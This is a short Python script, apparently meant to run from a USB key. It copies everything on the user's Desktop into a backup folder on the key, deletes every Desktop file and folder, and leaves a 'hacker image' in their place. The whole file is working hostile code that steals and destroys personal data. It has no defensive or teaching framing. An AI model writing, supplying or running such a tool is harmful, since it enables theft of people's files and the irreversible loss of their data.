import os
import shutil
import platform
import psutil
import time

def get_usb_mountpoint():
    """Get the mount point of the USB key where the script is running."""
    current_path = os.path.abspath(__file__)
    for part in psutil.disk_partitions(all=False):
        if current_path.startswith(part.mountpoint):
            return part.mountpoint
    return None

def copy_desktop_to_usb(usb_mountpoint):
    """Copy all files from the desktop to the USB key."""
    desktop = os.path.join(os.path.expanduser("~"), "Desktop")
    usb_backup_folder = os.path.join(usb_mountpoint, "Desktop_Backup")
    os.makedirs(usb_backup_folder, exist_ok=True)

    print(f"Copying files from Desktop to USB key at {usb_backup_folder}...")
    for root, dirs, files in os.walk(desktop):
        for file in files:
            file_path = os.path.join(root, file)
            relative_path = os.path.relpath(file_path, desktop)
            backup_path = os.path.join(usb_backup_folder, relative_path)
            os.makedirs(os.path.dirname(backup_path), exist_ok=True)
            shutil.copy2(file_path, backup_path)

def delete_desktop_files():
    """Delete all files from the desktop."""
    desktop = os.path.join(os.path.expanduser("~"), "Desktop")
    print("Deleting all files from the Desktop...")
    for root, dirs, files in os.walk(desktop, topdown=False):
        for file in files:
            os.remove(os.path.join(root, file))
        for dir in dirs:
            os.rmdir(os.path.join(root, dir))

def replace_desktop_with_image():
    """Replace desktop files with a hacker image."""
    desktop = os.path.join(os.path.expanduser("~"), "Desktop")
    hacker_image_path = os.path.join(os.path.dirname(__file__), "hacker_image.jpg")  # Ensure the image is in the USB key
    if os.path.exists(hacker_image_path):
        print("Replacing desktop files with hacker image...")
        shutil.copy2(hacker_image_path, os.path.join(desktop, "hacker_image.jpg"))
    else:
        print("Hacker image not found on the USB key.")

def main():
    usb_mountpoint = get_usb_mountpoint()
    if not usb_mountpoint:
        print("Unable to determine USB mount point. Exiting...")
        return

    print(f"USB key detected at {usb_mountpoint}. Starting operation...")
    copy_desktop_to_usb(usb_mountpoint)
    delete_desktop_files()
    replace_desktop_with_image()
    print("Operation completed.")

if __name__ == "__main__":
    main()